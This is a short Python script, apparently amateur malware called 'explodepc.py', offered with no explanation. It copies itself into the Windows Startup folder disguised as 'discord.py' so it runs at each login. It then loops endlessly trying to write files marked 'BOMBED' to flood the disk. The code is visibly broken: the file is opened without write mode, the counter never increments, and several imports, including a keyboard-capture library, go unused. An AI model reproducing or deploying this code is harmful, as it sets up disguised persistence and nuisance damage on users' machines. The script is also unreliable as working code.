import os
import socket
import subprocess
import random
import shutil
import pynput
import time
login =os.getlogin()
shutil.copy("explodepc.py" , "C:/Users/"+login+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/discord.py")
i = 1
while True:

 with open(str(i) + "discord.txt") as file:
  file.write("BOMBED")